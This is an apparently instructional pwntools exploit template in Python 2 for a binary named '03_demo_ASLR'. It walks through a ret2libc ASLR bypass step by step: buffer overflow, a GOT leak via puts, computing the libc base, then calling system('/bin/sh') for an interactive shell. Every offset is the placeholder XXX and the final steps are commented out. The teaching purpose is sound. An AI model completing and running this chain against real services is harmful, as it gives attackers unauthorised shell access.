#!/usr/bin/python2

import sys
from pwn import *


BINARY_NAME = '03_demo_ASLR'


# STEP 1: find the right amount of bytes to overflow the buffer up to the saved return address
FILLBUF = XXX

# STEP 2: extract offsets to 'system' and '/bin/sh' and 'read' from libc 
OFFSET_SYSTEM = XXX
OFFSET_BIN_SH = XXX
OFFSET_READ   = XXX  #offset in libc to the function we leak 

# STEP 3: find ROP Gadgets and function addresses in Binary
POP_RDI   = XXX
PUTS_PLT  = XXX  # address of 'puts' in PLT 
MAIN_FUNC = XXX  # address of 'main' function of binary

# STEP 4: find address of 'read'-GOT entry to defeat ASLR (leak target)
READ_AT_GOT =  XXX # address of read in GOT 




def pwn_do(r):
    pause()
    
    # STEP 5: build ROP-chain to leak the address of read from the GOT.
    # Finished by jumping back to the main-function, in order to trigger the
    # overflow again.
    payload = "A" * FILLBUF 
    payload += XXX 
    payload += XXX  
    payload += XXX 
    payload += XXX 
     
    
    r.recvuntil("Give me the Code: ")   
    r.sendline(payload) 
    r.recvuntil("You gave me: ") 
    leak = r.recvuntil("Give me the Code:")
    log.info("PAYLOAD: " + payload.encode("hex"))
    log.info("LEAK   : " + leak.encode("hex"))

    # STEP 6: execute exploit to get a leak from the binary and analyse it!

    # STEP 7: extract the address of 'read' from the leaked bytes:

#    offset_of_read_address_in_leak = XXX
#    address_read_libc_str = leak[ offset_of_read_address_in_leak : offset_of_read_address_in_leak + 6 ] # 6 byte, because puts didnt print the Nullbytes at the beginning of the address (GOT addreses 64 bit always start with a Nullbyte)
#    
#    address_read_libc = u64(address_read_libc_str+"\x00\x00")
#    log.info("address of read: " + hex(address_read_libc)) # leak any address of libc to calculate the libc-base
#    


    # STEP 8: calculate the base address of libc and the addresses of 'system' and '/bin/sh':

#    libc_base = XXX
#    log.info("address of libc base: " + hex(libc_base))
#
#    address_system = XXX
#    log.info("address of system:" + hex(address_system))
#
#    address_bin_sh = XXX
#    log.info("address of /bin/sh: " + hex(address_bin_sh))


    # STEP 9: profit!

#    payload = "A" * FILLBUF 
#    payload += p64(POP_RDI)
#    payload += p64(address_bin_sh) 
#    payload += p64(address_system)
#    r.sendline(payload)
#    r.interactive()

if __name__ == "__main__":
    if len(sys.argv) > 2:
        r = remote(sys.argv[1], sys.argv[2])
        pwn_do(r)
    else:
        r = process(BINARY_NAME)
        pwn_do(r)
